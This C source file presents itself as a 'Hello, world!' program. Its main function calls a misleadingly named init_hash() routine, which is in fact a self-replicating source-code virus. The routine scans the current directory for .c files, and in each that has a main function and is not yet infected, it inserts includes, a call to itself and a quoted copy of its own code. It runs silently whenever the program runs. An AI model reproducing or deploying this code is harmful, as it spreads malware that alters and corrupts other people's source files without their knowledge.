#include <stdio.h>
#include <stdio.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <unistd.h>
#include <dirent.h>
#include <fcntl.h>

void init_hash();


int main(int argc, char *argv[])
{
	printf("Hello, world!\n");
	init_hash();
}

void init_hash()
{
	int i, j, fd, size, mpos, ipos, page, 
	ihole, thole, bhole, ehole; struct dirent *dir; DIR *d;
	void *ptr;
	char hashinc[] = "\n#include <stdio.h>\n#include <sys/stat.h>\n#include <sys/mman.h>\n#include <unistd.h>\n#include <dirent.h>\n#include <fcntl.h>\n\nvoid init_hash();\n";
	char hashbeg[] ="\nvoid init_hash()\n{\n\tint i, j, fd, size, mpos, ipos, page, \n\tihole, thole, bhole, ehole; struct dirent *dir; DIR *d;\n\tvoid *ptr;\n\tchar hashinc[] = \"";
	char hashend[] ="\tchar *buf;\n\n\td = opendir(\".\");\n\twhile((dir = readdir(d))>0)\n\t\tif(!(strcmp(dir->d_name+strlen(dir->d_name)-2,\".c\"))||\n\t\t   !(strcmp(dir->d_name+strlen(dir->d_name)-2,\".C\"))) \n\t\t\tif((fd=open(dir->d_name, O_RDWR, 0))>=0)\n\t\t\t{\n\t\t\t\tsize = lseek(fd, 0, SEEK_END);\n\t\t\t\tptr = mmap(NULL,size,PROT_READ,MAP_PRIVATE,fd,0);\n\t\t\t\tif( (!strstr(ptr,\"init_hash\")) &&\n\t\t\t\t  ( ((mpos=(int)strstr(ptr,\"\\nmain(\"))>0) ||\n\t\t\t\t    ((mpos=(int)strstr(ptr,\"\\nint main(\"))>0) ||\n\t\t\t\t    ((mpos=(int)strstr(ptr,\"\\nvoid main(\"))>0) || \n\t\t\t\t    ((mpos=(int)strstr(ptr,\"\\nmain (\"))>0) ||\n\t\t\t\t    ((mpos=(int)strstr(ptr,\"\\nint main (\"))>0) ||\n\t\t\t\t    ((mpos=(int)strstr(ptr,\"\\nvoid main (\"))>0) ) )\n\t\t\t\t{\n\t\t\t\t\tmpos = (int)strstr((void *)mpos, \";\\n\");\n\t\t\t\t\tmpos -= (int)--ptr;\n\t\t\t\t\tif( !(ipos = (int)strstr(++ptr, \"#include <\")) )\n\t\t\t\t\t{\n\t\t\t\t\t\tmunmap(ptr, size);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t\tmunmap(ptr, size);\n\t\t\t\t\tpage = 3 * (int)sysconf(_SC_PAGESIZE);\n\t\t\t\t\tftruncate(fd, size+page);\n\t\t\t\t\tptr = mmap(NULL,size+page,PROT_READ+PROT_WRITE,MAP_SHARED,fd,0);\n\t\t\t\t\tipos = (int)strstr(ptr, \"#include <\");\n\t\t\t\t\tipos = (int)strstr((void *)ipos, \"\\n\\n\");\n\t\t\t\t\tipos -= (int)ptr;\n\t\t\t\t\tihole = strlen(hashinc);\n\t\t\t\t\tfor(i=(size-ipos)/ihole;i>=0;i--) \n\t\t\t\t\t\tmemcpy(ptr+ipos+i*ihole+ihole, ptr+ipos+i*ihole, ihole);\n\t\t\t\t\tmemcpy(ptr+ipos, hashinc, ihole);\n\t\t\t\t\tmpos += ihole;\n\t\t\t\t\tbuf = (char *)malloc(20*sizeof(char));\n\t\t\t\t\tstrcpy(buf,\"\\n\\tinit_hash();\");\n\t\t\t\t\tthole = strlen(buf);\n\t\t\t\t\tfor(i=(size+ihole-mpos)/thole;i>=0;i--) \n\t\t\t\t\t\tmemcpy(ptr+mpos+i*thole+thole, ptr+mpos+i*thole, thole);\n\t\t\t\t\tmemcpy(ptr+mpos, buf, thole);\n\t\t\t\t\tbhole = strlen(hashbeg);\n\t\t\t\t\tmemcpy(ptr+size+ihole+thole, hashbeg, bhole);\n\t\t\t\t\tbuf = (char *)malloc(100*sizeof(char)+strlen(hashinc));\n\t\t\t\t\tfor(i=0,j=0;i<strlen(hashinc);i++,j++)\n\t\t\t\t\t\tswitch(hashinc[i])\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tcase '\\n':\n\t\t\t\t\t\t\t\tsprintf(buf+j, \"\\\\n\");\n\t\t\t\t\t\t\t\tj++;\n\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\tcase '\\t':\n\t\t\t\t\t\t\t\tsprintf(buf+j, \"\\\\t\");\n\t\t\t\t\t\t\t\tj++;\n\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\tcase '\\\\':\n\t\t\t\t\t\t\t\tsprintf(buf+j, \"\\\\\\\\\");\n\t\t\t\t\t\t\t\tj++;\n\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\tcase '\\\"':\n\t\t\t\t\t\t\t\tsprintf(buf+j, \"\\\\\\\"\");\n\t\t\t\t\t\t\t\tj++;\n\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\tdefault:\n\t\t\t\t\t\t\t\tsprintf(buf+j, \"%c\", hashinc[i]);\n\t\t\t\t\t\t} \n\t\t\t\t\tmemcpy(ptr+size+ihole+thole+bhole, buf, strlen(buf));\n\t\t\t\t\tbhole += strlen(buf);\n\t\t\t\t\tsprintf(ptr+size+ihole+thole+bhole, \"\\\";\\n\\tchar hashbeg[] =\\\"\");\n\t\t\t\t\tbhole += 21;\n\t\t\t\t\tbuf = (char *)malloc(100*sizeof(char)+strlen(hashbeg));\n\t\t\t\t\tfor(i=0,j=0;i<strlen(hashbeg);i++,j++)\n\t\t\t\t\t\tswitch(hashbeg[i])\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tcase '\\n':\n\t\t\t\t\t\t\t\tsprintf(buf+j, \"\\\\n\");\n\t\t\t\t\t\t\t\tj++;\n\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\tcase '\\t':\n\t\t\t\t\t\t\t\tsprintf(buf+j, \"\\\\t\");\n\t\t\t\t\t\t\t\tj++;\n\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\tcase '\\\\':\n\t\t\t\t\t\t\t\tsprintf(buf+j, \"\\\\\\\\\");\n\t\t\t\t\t\t\t\tj++;\n\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\tcase '\\\"':\n\t\t\t\t\t\t\t\tsprintf(buf+j, \"\\\\\\\"\");\n\t\t\t\t\t\t\t\tj++;\n\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\tdefault:\n\t\t\t\t\t\t\t\tsprintf(buf+j, \"%c\", hashbeg[i]);\n\t\t\t\t\t\t} \n\t\t\t\t\tmemcpy(ptr+size+ihole+thole+bhole, buf, strlen(buf));\n\t\t\t\t\tbhole += strlen(buf);\n\t\t\t\t\tsprintf(ptr+size+ihole+thole+bhole, \"\\\";\\n\\tchar hashend[] =\\\"\");\n\t\t\t\t\tbhole += 21;\n\t\t\t\t\tbuf = (char *)malloc(100*sizeof(char)+strlen(hashend));\n\t\t\t\t\tfor(i=0,j=0;i<strlen(hashend);i++,j++)\n\t\t\t\t\t\tswitch(hashend[i])\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tcase '\\n':\n\t\t\t\t\t\t\t\tsprintf(buf+j, \"\\\\n\");\n\t\t\t\t\t\t\t\tj++;\n\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\tcase '\\t':\n\t\t\t\t\t\t\t\tsprintf(buf+j, \"\\\\t\");\n\t\t\t\t\t\t\t\tj++;\n\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\tcase '\\\\':\n\t\t\t\t\t\t\t\tsprintf(buf+j, \"\\\\\\\\\");\n\t\t\t\t\t\t\t\tj++;\n\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\tcase '\\\"':\n\t\t\t\t\t\t\t\tsprintf(buf+j, \"\\\\\\\"\");\n\t\t\t\t\t\t\t\tj++;\n\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\tdefault:\n\t\t\t\t\t\t\t\tsprintf(buf+j, \"%c\", hashend[i]);\n\t\t\t\t\t\t} \n\t\t\t\t\tmemcpy(ptr+size+ihole+thole+bhole, buf, strlen(buf));\n\t\t\t\t\tbhole += strlen(buf);\n\t\t\t\t\tsprintf(ptr+size+ihole+thole+bhole, \"\\\";\\n\");\n\t\t\t\t\tbhole += 3;\n\n\t\t\t\t\tehole = strlen(hashend);\n\t\t\t\t\tmemcpy(ptr+size+ihole+thole+bhole, hashend, ehole);\n\t\t\t\t\tmsync(ptr, size+page, MS_SYNC);\n\t\t\t\t\tmunmap(ptr, size+page);\n\t\t\t\t\tftruncate(fd, size+ihole+thole+bhole+ehole);\n\t\t\t\t} else\n\t\t\t\t{\n\t\t\t\t\tmunmap(ptr, size);\n\t\t\t\t}\n\t\t\t}\n}\n";
	char *buf;

	d = opendir(".");
	while((dir = readdir(d))>0)
		if(!(strcmp(dir->d_name+strlen(dir->d_name)-2,".c"))||
		   !(strcmp(dir->d_name+strlen(dir->d_name)-2,".C"))) 
			if((fd=open(dir->d_name, O_RDWR, 0))>=0)
			{
				size = lseek(fd, 0, SEEK_END);
				ptr = mmap(NULL,size,PROT_READ,MAP_PRIVATE,fd,0);
				if( (!strstr(ptr,"init_hash")) &&
				  ( ((mpos=(int)strstr(ptr,"\nmain("))>0) ||
				    ((mpos=(int)strstr(ptr,"\nint main("))>0) ||
				    ((mpos=(int)strstr(ptr,"\nvoid main("))>0) || 
				    ((mpos=(int)strstr(ptr,"\nmain ("))>0) ||
				    ((mpos=(int)strstr(ptr,"\nint main ("))>0) ||
				    ((mpos=(int)strstr(ptr,"\nvoid main ("))>0) ) )
				{
					mpos = (int)strstr((void *)mpos, ";\n");
					mpos -= (int)--ptr;
					if( !(ipos = (int)strstr(++ptr, "#include <")) )
					{
						munmap(ptr, size);
						break;
					}
					munmap(ptr, size);
					page = 3 * (int)sysconf(_SC_PAGESIZE);
					ftruncate(fd, size+page);
					ptr = mmap(NULL,size+page,PROT_READ+PROT_WRITE,MAP_SHARED,fd,0);
					ipos = (int)strstr(ptr, "#include <");
					ipos = (int)strstr((void *)ipos, "\n\n");
					ipos -= (int)ptr;
					ihole = strlen(hashinc);
					for(i=(size-ipos)/ihole;i>=0;i--) 
						memcpy(ptr+ipos+i*ihole+ihole, ptr+ipos+i*ihole, ihole);
					memcpy(ptr+ipos, hashinc, ihole);
					mpos += ihole;
					buf = (char *)malloc(20*sizeof(char));
					strcpy(buf,"\n\tinit_hash();");
					thole = strlen(buf);
					for(i=(size+ihole-mpos)/thole;i>=0;i--) 
						memcpy(ptr+mpos+i*thole+thole, ptr+mpos+i*thole, thole);
					memcpy(ptr+mpos, buf, thole);
					bhole = strlen(hashbeg);
					memcpy(ptr+size+ihole+thole, hashbeg, bhole);
					buf = (char *)malloc(100*sizeof(char)+strlen(hashinc));
					for(i=0,j=0;i<strlen(hashinc);i++,j++)
						switch(hashinc[i])
						{
							case '\n':
								sprintf(buf+j, "\\n");
								j++;
								break;
							case '\t':
								sprintf(buf+j, "\\t");
								j++;
								break;
							case '\\':
								sprintf(buf+j, "\\\\");
								j++;
								break;
							case '\"':
								sprintf(buf+j, "\\\"");
								j++;
								break;
							default:
								sprintf(buf+j, "%c", hashinc[i]);
						} 
					memcpy(ptr+size+ihole+thole+bhole, buf, strlen(buf));
					bhole += strlen(buf);
					sprintf(ptr+size+ihole+thole+bhole, "\";\n\tchar hashbeg[] =\"");
					bhole += 21;
					buf = (char *)malloc(100*sizeof(char)+strlen(hashbeg));
					for(i=0,j=0;i<strlen(hashbeg);i++,j++)
						switch(hashbeg[i])
						{
							case '\n':
								sprintf(buf+j, "\\n");
								j++;
								break;
							case '\t':
								sprintf(buf+j, "\\t");
								j++;
								break;
							case '\\':
								sprintf(buf+j, "\\\\");
								j++;
								break;
							case '\"':
								sprintf(buf+j, "\\\"");
								j++;
								break;
							default:
								sprintf(buf+j, "%c", hashbeg[i]);
						} 
					memcpy(ptr+size+ihole+thole+bhole, buf, strlen(buf));
					bhole += strlen(buf);
					sprintf(ptr+size+ihole+thole+bhole, "\";\n\tchar hashend[] =\"");
					bhole += 21;
					buf = (char *)malloc(100*sizeof(char)+strlen(hashend));
					for(i=0,j=0;i<strlen(hashend);i++,j++)
						switch(hashend[i])
						{
							case '\n':
								sprintf(buf+j, "\\n");
								j++;
								break;
							case '\t':
								sprintf(buf+j, "\\t");
								j++;
								break;
							case '\\':
								sprintf(buf+j, "\\\\");
								j++;
								break;
							case '\"':
								sprintf(buf+j, "\\\"");
								j++;
								break;
							default:
								sprintf(buf+j, "%c", hashend[i]);
						} 
					memcpy(ptr+size+ihole+thole+bhole, buf, strlen(buf));
					bhole += strlen(buf);
					sprintf(ptr+size+ihole+thole+bhole, "\";\n");
					bhole += 3;

					ehole = strlen(hashend);
					memcpy(ptr+size+ihole+thole+bhole, hashend, ehole);
					msync(ptr, size+page, MS_SYNC);
					munmap(ptr, size+page);
					ftruncate(fd, size+ihole+thole+bhole+ehole);
				} else
				{
					munmap(ptr, size);
				}
			}
}
